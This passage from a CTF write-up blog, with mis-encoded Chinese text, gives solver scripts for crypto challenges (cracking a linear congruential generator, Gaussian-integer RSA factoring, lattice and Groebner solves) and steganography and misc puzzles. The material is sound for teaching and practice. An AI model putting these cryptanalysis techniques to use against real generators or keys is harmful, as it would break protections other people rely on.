class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crack_unknown_multiplier</span>(<span class="params">states, modulus</span>):</span><br><span class="line">    multiplier = (states[<span class="number">2</span>] - states[<span class="number">1</span>]) * modinv(states[<span class="number">1</span>] - states[<span class="number">0</span>], modulus) % modulus</span><br><span class="line">    <span class="keyword">return</span> crack_unknown_increment(states, modulus, multiplier)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crack_unknown_modulus</span>(<span class="params">states</span>):</span><br><span class="line">    diffs = [s1 - s0 <span class="keyword">for</span> s0, s1 <span class="keyword">in</span> <span class="built_in">zip</span>(states, states[<span class="number">1</span>:])]</span><br><span class="line">    zeroes = [t2*t0 - t1*t1 <span class="keyword">for</span> t0, t1, t2 <span class="keyword">in</span> <span class="built_in">zip</span>(diffs, diffs[<span class="number">1</span>:], diffs[<span class="number">2</span>:])]</span><br><span class="line">    modulus = <span class="built_in">abs</span>(reduce(gcd, zeroes))</span><br><span class="line">    <span class="keyword">return</span> crack_unknown_multiplier(states, modulus)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choose_card</span>(<span class="params">num</span>):</span><br><span class="line">    x = (num&gt;&gt;<span class="number">5</span>)%<span class="number">4</span></span><br><span class="line">    <span class="keyword">if</span> x == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (num&gt;&gt;<span class="number">6</span>)%<span class="number">13</span>, <span class="string">&#x27;Heart&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> x%<span class="number">4</span> == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> (num&gt;&gt;<span class="number">6</span>)%<span class="number">13</span>, <span class="string">&#x27;Spade&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> x%<span class="number">4</span> == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> (num&gt;&gt;<span class="number">6</span>)%<span class="number">13</span>, <span class="string">&#x27;Diamond&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> (num&gt;&gt;<span class="number">6</span>)%<span class="number">13</span>, <span class="string">&#x27;Club&#x27;</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;59.110.20.54&quot;</span>,<span class="number">4953</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;option: &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">seq = []</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;gift: &#x27;</span>)</span><br><span class="line">seq += <span class="built_in">eval</span>(r.recvline())</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;gift: &#x27;</span>)</span><br><span class="line">seq += <span class="built_in">eval</span>(r.recvline())</span><br><span class="line"><span class="built_in">print</span>(seq)</span><br><span class="line"></span><br><span class="line">n, m, c = crack_unknown_modulus(seq)</span><br><span class="line"><span class="built_in">print</span>((n,m,c))</span><br><span class="line"></span><br><span class="line">out = seq[-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    <span class="built_in">next</span> = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        out = (out*m+c)%n</span><br><span class="line">        card,suit = choose_card(out)</span><br><span class="line">        real_card = <span class="built_in">str</span>(card+<span class="number">1</span>).replace(<span class="string">&#x27;10&#x27;</span>,<span class="string">&#x27;0&#x27;</span>).replace(<span class="string">&#x27;11&#x27;</span>,<span class="string">&#x27;J&#x27;</span>).replace(<span class="string">&#x27;12&#x27;</span>,<span class="string">&#x27;Q&#x27;</span>).replace(<span class="string">&#x27;13&#x27;</span>,<span class="string">&#x27;K&#x27;</span>).replace(<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">        <span class="built_in">next</span>.append(<span class="string">f&#x27;<span class="subst">&#123;suit&#125;</span>_<span class="subst">&#123;real_card&#125;</span>&#x27;</span>.encode())</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">next</span> = <span class="string">b&#x27; &#x27;</span>.join(<span class="built_in">next</span>)</span><br><span class="line">    <span class="built_in">print</span>(k,<span class="built_in">next</span>)</span><br><span class="line">    </span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;(example: Heart_1 Club_2 Diamond_3)\n&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">next</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r.recvall().decode())</span><br><span class="line"></span><br><span class="line"><span class="comment"># Congratulations! You matched the cards!</span></span><br><span class="line"><span class="comment"># The flag is your reward!</span></span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;lcg_a@@@@@ttack&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="EzComplex"><a href="#EzComplex" class="headerlink" title="EzComplex"></a>EzComplex</h3><blockquote><p>And u, my friend: Complex factors! (In a double sense)</p></blockquote><p>é«˜æ–¯æ•´æ•°åˆ†è§£ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">c = <span class="number">122977267154486898127643454001467185956864368276013342450998567212966113302012584153291519651365278888605594000436279106907163024162771486315220072170917153855370362692990814276908399943293854077912175867886513964032241638851526276</span></span><br><span class="line">N = <span class="number">973990451943921675425625260267293227445098713194663380695161260771362036776671793195525239267004528550439258233703798932349677698127549891815995206853756301593324349871567926792912475619794804691721625860861059975526781239293017498</span></span><br><span class="line">GI = GaussianIntegers()</span><br><span class="line">d = divisors(GI(N))</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> d:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;I&#x27;</span> <span class="keyword">in</span> <span class="built_in">str</span>(k):</span><br><span class="line">        p = <span class="built_in">int</span>(<span class="built_in">abs</span>(k.imag()))</span><br><span class="line">        q = <span class="built_in">int</span>(<span class="built_in">abs</span>(k.real()))</span><br><span class="line">        <span class="keyword">if</span> p.bit_length() <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">382</span>,<span class="number">385</span>) <span class="keyword">and</span> is_prime(p) <span class="keyword">and</span> q.bit_length() <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">382</span>,<span class="number">385</span>) <span class="keyword">and</span> is_prime(q):</span><br><span class="line">            <span class="built_in">print</span>((p,q))</span><br><span class="line">            </span><br><span class="line"><span class="comment"># (8732781022306464325787401448517171026218291389436971731700810979177651389459896422549428444142746055523338740248707, 29962125885196559918101088622575501736433575381042696980660846307183241725227137854663856022170515177120773072848343)</span></span><br><span class="line"><span class="comment"># (29962125885196559918101088622575501736433575381042696980660846307183241725227137854663856022170515177120773072848343, 8732781022306464325787401448517171026218291389436971731700810979177651389459896422549428444142746055523338740248707)</span></span><br></pre></td></tr></table></figure><p>å†å¸¸è§„RSAï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">p,q = (<span class="number">8732781022306464325787401448517171026218291389436971731700810979177651389459896422549428444142746055523338740248707</span>, <span class="number">29962125885196559918101088622575501736433575381042696980660846307183241725227137854663856022170515177120773072848343</span>)</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">c = <span class="number">122977267154486898127643454001467185956864368276013342450998567212966113302012584153291519651365278888605594000436279106907163024162771486315220072170917153855370362692990814276908399943293854077912175867886513964032241638851526276</span></span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse_mod(e,f)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,p*q)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;D0_you_like_r41n?_i_pref3r_R1_ng&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="ext-7gcd"><a href="#ext-7gcd" class="headerlink" title="ext^7gcd"></a>ext^7gcd</h3><blockquote><p>é¢˜ç›®é“¾æ¥ï¼šnc 59.110.20.54:1789 ï¼ˆä¸‹sagemath! ä¸ä¸‹çš„ç»Ÿç»Ÿå‘é…åˆ°å®‰ä¸œæ˜Ÿå½“å˜¿å¥´ï¼ï¼‰</p></blockquote><p>åˆ†æï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a1*p1+a2*p2=1</span><br><span class="line">a3*p3+a4*p4=1</span><br><span class="line">a5*p5+a6*p6=1</span><br><span class="line">a0*p0+a*(a1*p1+a2*p2+a3*p3+a4*p4+a5*p5+a6*p6)=a0*p0+a*3=1</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;59.110.20.54&quot;</span>,<span class="number">1789</span>)</span><br><span class="line"></span><br><span class="line">table = string.ascii_letters+string.digits</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">PoW</span>():</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;XXXX+&quot;</span>)</span><br><span class="line">    suffix = r.recv(<span class="number">16</span>).decode(<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;== &quot;</span>)</span><br><span class="line">    cipher = r.recvline().strip().decode(<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">    proof = mbruteforce(<span class="keyword">lambda</span> x: sha256((x + suffix).encode()).hexdigest() ==</span><br><span class="line">                        cipher, table, length=<span class="number">4</span>, method=<span class="string">&#x27;fixed&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;XXXX: &#x27;</span>, proof.encode())</span><br><span class="line">    </span><br><span class="line">PoW()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xgcd</span>(<span class="params">a,b</span>):</span><br><span class="line">    prevx, x = <span class="number">1</span>, <span class="number">0</span>;  prevy, y = <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> b:</span><br><span class="line">        q, r = <span class="built_in">divmod</span>(a,b)</span><br><span class="line">        x, prevx = prevx - q*x, x  </span><br><span class="line">        y, prevy = prevy - q*y, y</span><br><span class="line">        a, b = b, r</span><br><span class="line">    <span class="keyword">return</span> a, prevx, prevy</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;[&#x27;</span>)</span><br><span class="line">    p = <span class="built_in">eval</span>(<span class="string">b&#x27;[&#x27;</span>+r.recvuntil(<span class="string">b&#x27;]&#x27;</span>))</span><br><span class="line">    _,a1,a2 = xgcd(p[<span class="number">1</span>],p[<span class="number">2</span>])</span><br><span class="line">    _,a3,a4 = xgcd(p[<span class="number">3</span>],p[<span class="number">4</span>])</span><br><span class="line">    _,a5,a6 = xgcd(p[<span class="number">5</span>],p[<span class="number">6</span>])</span><br><span class="line">    _,a0,a = xgcd(p[<span class="number">0</span>],<span class="number">3</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;a6: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">f&#x27;<span class="subst">&#123;a0&#125;</span>,<span class="subst">&#123;a*a1&#125;</span>,<span class="subst">&#123;a*a2&#125;</span>,<span class="subst">&#123;a*a3&#125;</span>,<span class="subst">&#123;a*a4&#125;</span>,<span class="subst">&#123;a*a5&#125;</span>,<span class="subst">&#123;a*a6&#125;</span>&#x27;</span>.encode())</span><br><span class="line">    <span class="built_in">print</span>(r.recvline())</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Congrats! Your flag is: SYC&#123;N0t_s0_e4sy_3xtgCd&#125;</span></span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="Algebra"><a href="#Algebra" class="headerlink" title="Algebra"></a>Algebra</h3><blockquote><p>Recently jrl888 has learned something about groebner_basis.But could U plz help him to sovle his linear algebra homework?</p></blockquote><p>çŸ©é˜µ <code>1*32 * 32*16 = 1*16</code>ï¼Œæ„é€ æ ¼è§„çº¦ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="number">76231309481023608274751321361920497941621991893430257210800219032855778863403</span></span><br><span class="line">M = [...]</span><br><span class="line">c = [...]</span><br><span class="line"></span><br><span class="line">M = matrix(ZZ, <span class="number">32</span>,<span class="number">16</span>, M)</span><br><span class="line">I = identity_matrix(<span class="number">32</span>)</span><br><span class="line">P = p * identity_matrix(<span class="number">16</span>)</span><br><span class="line">C = matrix(ZZ, c)</span><br><span class="line">Z1 = zero_matrix(<span class="number">16</span>,<span class="number">32</span>)</span><br><span class="line">Z2 = zero_matrix(<span class="number">1</span>,<span class="number">32</span>)</span><br><span class="line">L = block_matrix(ZZ,[[M,I],[P,Z1],[C,Z2]])</span><br><span class="line">B = L.LLL()</span><br><span class="line">key = <span class="built_in">list</span>(-B[<span class="number">1</span>][<span class="number">16</span>:])</span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line"></span><br><span class="line"><span class="comment"># [241, 234, 29, 209, 141, 236, 196, 125, 153, 121, 243, 104, 157, 250, 164, 197, 241, 85, 184, 247, 145, 27, 128, 184, 203, 233, 104, 196, 118, 255, 12, 24]</span></span><br></pre></td></tr></table></figure><p>å†æ ¹æ®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">x1^e0%p=c0</span><br><span class="line">x2^e1%p=c1</span><br><span class="line">x3^e2%p=c2</span><br><span class="line">x1+x2+x3=s</span><br><span class="line">GBåŸºè§£</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">key = [<span class="number">241</span>, <span class="number">234</span>, <span class="number">29</span>, <span class="number">209</span>, <span class="number">141</span>, <span class="number">236</span>, <span class="number">196</span>, <span class="number">125</span>, <span class="number">153</span>, <span class="number">121</span>, <span class="number">243</span>, <span class="number">104</span>, <span class="number">157</span>, <span class="number">250</span>, <span class="number">164</span>, <span class="number">197</span>, <span class="number">241</span>, <span class="number">85</span>, <span class="number">184</span>, <span class="number">247</span>, <span class="number">145</span>, <span class="number">27</span>, <span class="number">128</span>, <span class="number">184</span>, <span class="number">203</span>, <span class="number">233</span>, <span class="number">104</span>, <span class="number">196</span>, <span class="number">118</span>, <span class="number">255</span>, <span class="number">12</span>, <span class="number">24</span>]</span><br><span class="line">key = <span class="built_in">int</span>(<span class="built_in">bytes</span>(key).<span class="built_in">hex</span>(),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line">c = [<span class="number">5415723658972576382153559473862560277755192970021711034483296770242757614573901416501357332661976379693731699836578087114136761491831672836130172409491889</span>, <span class="number">210713951733721296094981135225517096332793112439184310028590576805069783972692891743044656754643189870169698041576462365740899368554671164493356650858567594970345928936103914826926922045852943068526737627918609421198466329605091625</span>, <span class="number">93558120697660628972553751937347865465963385519812302371069578286123647411810258547153399045605149278436900736665388355004346922404097196048139360206875149390218160164739477798859206611473675859708579299466581718543909912951088772842957187413726251892347470983848602814387339449340072310561011153714207338630</span>]</span><br><span class="line">p = <span class="number">175336555462486363373099551411803174933803940918372428249159666803182759268063415863987676455854054651631174131625763475189413468427467197699058719725221879406119373683175842618465694427132003565774900609456204965408254598477034791500576573579131820364396996254469692964946065509325801687720344376041097328929</span></span><br><span class="line">s = <span class="number">192597139210277682598060185912821582569043452465684540030278464832244948354365</span></span><br><span class="line"></span><br><span class="line">P.&lt;i&gt; = PolynomialRing(ZZ)</span><br><span class="line">f = i^<span class="number">3</span> - <span class="number">10</span>*i^<span class="number">2</span> + <span class="number">31</span>*i - <span class="number">30</span></span><br><span class="line">res = f.roots()</span><br><span class="line">e = [k[<span class="number">0</span>] <span class="keyword">for</span> k <span class="keyword">in</span> res]</span><br><span class="line"></span><br><span class="line">P.&lt;x1,x2,x3&gt; = PolynomialRing(Zmod(p))</span><br><span class="line">f1 = x1^e[<span class="number">2</span>]-c[<span class="number">0</span>]</span><br><span class="line">f2 = x2^e[<span class="number">1</span>]-c[<span class="number">1</span>]</span><br><span class="line">f3 = x3^e[<span class="number">0</span>]-c[<span class="number">2</span>]</span><br><span class="line">f4 = x1+x2+x3-s</span><br><span class="line">G = Ideal([f1, f2, f3, f4]).groebner_basis()</span><br><span class="line"><span class="built_in">print</span>(G)</span><br><span class="line">m = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> G:</span><br><span class="line">    <span class="keyword">assert</span> b.degree() == <span class="number">1</span></span><br><span class="line">    mi = ZZ(-b(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(mi^^key)[<span class="number">2</span>:]))</span><br><span class="line">    </span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;You_are_SYC&#123;You_are_SYC&#123;You_&#x27;</span></span><br><span class="line"><span class="comment"># b&#x27;really_algebreally_algebreally_a&#x27;</span></span><br><span class="line"><span class="comment"># b&#x27;ra_master&#125;\x02\x02ra_master&#125;\x02\x02ra_maste&#x27;</span></span><br></pre></td></tr></table></figure><p>flagï¼š<code>SYC&#123;You_are_really_algebra_master&#125;</code>ã€‚</p><p>â€‹</p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="cheekin"><a href="#cheekin" class="headerlink" title="cheekin"></a>cheekin</h3><blockquote><p>è¯·å‰å¾€â€ä¸‰å¶è‰å°ç»„Sycloverâ€å¾®ä¿¡å…¬ä¼—å·è¾“å…¥flagè·å¾—flag</p></blockquote><p>å‘é€flagï¼Œä¸‹è½½å›¾ç‰‡ï¼Œzstegçš„b1,rgb,lsb,xyé€šé“æœ‰ <code>syc&#123;s4y_he110_t0_syclover&#125;</code>ã€‚</p><p>â€‹</p><h3 id="ez-smilemo"><a href="#ez-smilemo" class="headerlink" title="ez_smilemo"></a>ez_smilemo</h3><blockquote><p>æ¸¸æˆé€šå…³å³å¯å¾—åˆ°flagå†…å®¹ï¼Œéœ€è¦è‡ªè¡Œæ·»åŠ <code>SYC&#123;&#125;</code>åŒ…å«ã€‚ä¾‹: flagå†…å®¹ä¸º haha_haha åˆ™æœ€ç»ˆflagä¸º SYC{haha_haha} é¢˜ç›®é“¾æ¥ï¼š<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1Vfklz0_isBoHNylRv8um8w?pwd=geek">https://pan.baidu.com/s/1Vfklz0_isBoHNylRv8um8w?pwd=geek</a> hint: data.win</p></blockquote><p>ä½¿ç”¨<a target="_blank" rel="noopener" href="https://github.com/krzys-h/UndertaleModTool">UndertaleModTool</a>å·¥å…·è§£åŒ…data.winï¼Œåœ¨stringçª—å£æ‰¾åˆ°ï¼š<code>c20xbGVfMXNfQF9uMWNlX2dAbWU=</code>ï¼Œbase64è§£ç ï¼š<code>sm1le_1s_@_n1ce_g@me</code>ã€‚</p><p>flagï¼š<code>SYC&#123;sm1le_1s_@_n1ce_g@me&#125;</code></p><p>â€‹</p><h3 id="DEATH-N0TE"><a href="#DEATH-N0TE" class="headerlink" title="DEATH_N0TE"></a>DEATH_N0TE</h3><blockquote><p>â€œo2takuXXçªç„¶å¤±è¸ªäº†ï¼Œä½ ä½œä¸ºä»–çš„å¥½æœ‹å‹ï¼Œå†³å®šå»ä»–çš„æˆ¿é—´çœ‹çœ‹æ˜¯å¦ç•™ä¸‹äº†ä»€ä¹ˆçº¿ç´¢â€¦â€ã€‚å‰ç½®å‰§æƒ…é¢˜ï¼Œflagæœ‰ä¸¤æ®µï¼Œéšå†™çš„ä¿¡æ¯æœ‰ç‚¹å¤šè®°å¾—ç»™ä¿¡æ¯æ‹¿å…¨ã€‚ hint1: Stegsolve lsb hint2: å›¾ç‰‡å¤§å°å’Œåƒç´ ç‚¹</p></blockquote><p>pngå›¾ç‰‡æœ«å°¾æå–å‡ºï¼š</p><p><code>IuS9oOaJvuWIsOS6huS4gOacrOOAikRFQVRIIE5PVEXjgIvvvIzlpb3lpYflv4PpqbHkvb/kvaDnv7vlvIDov5nmnKznrJTorrDvvIzkvaDpmIXor7vkuobkvb/nlKjop4TliJnvvIzkvYbmmK/kvaDmg4rorrblnLDlj5HnjrDliJrmiY3nmoTop4TliJnkuYvkuK3llK/ni6zmsqHmnInnrKwxMOadoS4uLiIKIuS9oOWGjeasoeWOu+ehruiupOaYr+WQpuWmguatpO+8jOeslOiusOS4iueahOaWh+Wtl+WNtOS7v+S9m+a0u+S6hui1t+adpe+8jOWcqOS9oOecvOS4reS4jeaWreWcsOaUvuWkp+e8qeWwj++8jOS9oOmXreS4iuS6huWPjOecvC4uLiIKIuWOn+acrOm7keiJsueahOaWh+Wtl+S4gOi9rOWPmOaIkOihgOe6ouiJsu+8jOivoeW8gueahOeUu+mdoui/mOaYr+WHuueOsOS6juS9oOeahOinhue9keiGnOWJje+8jOS9oOWGs+WumuS4jeWGjee6oOe7k+S6jumBl+WkseeahOinhOWIme+8jOW5u+iniea2iOWkseS6hi4uLiI=</code></p><p>base64è§£ç ï¼š</p><p><code>&quot;ä½ æ‰¾åˆ°äº†ä¸€æœ¬ã€ŠDEATH NOTEã€‹ï¼Œå¥½å¥‡å¿ƒé©±ä½¿ä½ ç¿»å¼€è¿™æœ¬ç¬”è®°ï¼Œä½ é˜…è¯»äº†ä½¿ç”¨è§„åˆ™ï¼Œä½†æ˜¯ä½ æƒŠè®¶åœ°å‘ç°åˆšæ‰çš„è§„åˆ™ä¹‹ä¸­å”¯ç‹¬æ²¡æœ‰ç¬¬10æ¡...&quot; &quot;ä½ å†æ¬¡å»ç¡®è®¤æ˜¯å¦å¦‚æ­¤ï¼Œç¬”è®°ä¸Šçš„æ–‡å­—å´ä»¿ä½›æ´»äº†èµ·æ¥ï¼Œåœ¨ä½ çœ¼ä¸­ä¸æ–­åœ°æ”¾å¤§ç¼©å°ï¼Œä½ é—­ä¸Šäº†åŒçœ¼...&quot; &quot;åŸæœ¬é»‘è‰²çš„æ–‡å­—ä¸€è½¬å˜æˆè¡€çº¢è‰²ï¼Œè¯¡å¼‚çš„ç”»é¢è¿˜æ˜¯å‡ºç°äºä½ çš„è§†ç½‘è†œå‰ï¼Œä½ å†³å®šä¸å†çº ç»“äºé—å¤±çš„è§„åˆ™ï¼Œå¹»è§‰æ¶ˆå¤±äº†...&quot;</code></p><p>æ²¡ä»€ä¹ˆç”¨ï¼Œzsteg åœ¨ b1,rgb,lsb,xy é€šé“æå–å‡ºï¼š</p><p><code>IuS9oOe7p+e7reinguWvn+aJi+S4iua8hum7keiJsueahOeslOiusOacrO+8jOWGt+mdmeS4i+adpeeahOS9oOWPkeeOsOS6huiXj+WcqOWwgemdouacgOS4i+i+ueeahOS4gOihjOWwj+WtlzpTWUN7RDRAVGhfTjB0NF8iCiLkvaDmtY/op4jov4fmlbTkuKrnrJTorrDmnKzvvIzlj6/mg5zlhajmmK/nqbrnmb3pobXvvIzlhbbkuK3mnInkuIDpobXkuI3nn6XpgZPooqvosIHmkpXmjonkuobvvIzkvaDmnIDnu4jov5jmmK/nv7vliLDkuobnvLrlpLHnmoTpgqPkuIDpobUiCiLkvaDnlKjpk4XnrJTmtoLmirnnnYDlkI7pnaLkuIDpobXvvIzkuIrpnaLnvJPnvJPlh7rnjrDkuobpgZflpLHnmoTnl5Xov7kuLi4i</code></p><p>base64è§£ç ï¼š</p><p><code>&quot;ä½ ç»§ç»­è§‚å¯Ÿæ‰‹ä¸Šæ¼†é»‘è‰²çš„ç¬”è®°æœ¬ï¼Œå†·é™ä¸‹æ¥çš„ä½ å‘ç°äº†è—åœ¨å°é¢æœ€ä¸‹è¾¹çš„ä¸€è¡Œå°å­—:SYC&#123;D4@Th_N0t4_&quot; &quot;ä½ æµè§ˆè¿‡æ•´ä¸ªç¬”è®°æœ¬ï¼Œå¯æƒœå…¨æ˜¯ç©ºç™½é¡µï¼Œå…¶ä¸­æœ‰ä¸€é¡µä¸çŸ¥é“è¢«è°æ’•æ‰äº†ï¼Œä½ æœ€ç»ˆè¿˜æ˜¯ç¿»åˆ°äº†ç¼ºå¤±çš„é‚£ä¸€é¡µ&quot; &quot;ä½ ç”¨é“…ç¬”æ¶‚æŠ¹ç€åé¢ä¸€é¡µï¼Œä¸Šé¢ç¼“ç¼“å‡ºç°äº†é—å¤±çš„ç—•è¿¹...&quot;</code></p><p>å¾—åˆ°flagå‰åŠæ®µï¼š<code>SYC&#123;D4@Th_N0t4_</code>ã€‚</p><p>æ”¾å¤§å›¾ç‰‡ï¼Œå¯å‘ç°ç™½è‰²åƒç´ ç‚¹ï¼Œç»“åˆé¢˜ç›®æŸ¥æ‰¾ä¸º<a target="_blank" rel="noopener" href="https://www.fonts.net.cn/font-17419261686.html">æ­»äº¡ç¬”è®°å­—ä½“</a>ï¼Œå­—ç¬¦ä¸²ï¼š<code>TkFNRV9vMnRha3VYWH0</code></p><p>base64è§£ç å¾—åˆ°flagååŠæ®µï¼š<code>NAME_o2takuXX&#125;</code>ã€‚</p><p>flagï¼š<code>SYC&#123;D4@Th_N0t4_NAME_o2takuXX&#125;</code></p><p>â€‹</p><h3 id="ä¸‹ä¸€ç«™æ˜¯å“ªå„¿å‘¢"><a href="#ä¸‹ä¸€ç«™æ˜¯å“ªå„¿å‘¢" class="headerlink" title="ä¸‹ä¸€ç«™æ˜¯å“ªå„¿å‘¢"></a>ä¸‹ä¸€ç«™æ˜¯å“ªå„¿å‘¢</h3><blockquote><p>æˆ‘å’Œyxxå»æ—…æ¸¸ï¼Œå‰ä¸€å¤©è¿˜å¥½å¥½çš„ï¼Œç©å®Œã€ŠæŒ‡æŒ¥å®˜åŸºæ©ã€‹è¿™ä¸ªæ¸¸æˆå°±ç¡è§‰äº†ï¼Œç¬¬äºŒå¤©æ™šä¸Šåƒå®Œé¥­å¥¹äººå°±ä¸è§äº†ï¼Œèµ°ä¹‹å‰ç•™ä¸‹äº†ä¸¤å¼ å›¾ç‰‡å°±æ¶ˆå¤±äº†ã€‚ä½ èƒ½å¸®æˆ‘æ‰¾æ‰¾å¥¹åå“ªä¸ªèˆªç­å»å“ªä¸ªåœ°æ–¹äº†å˜›ï¼Ÿ flagæ 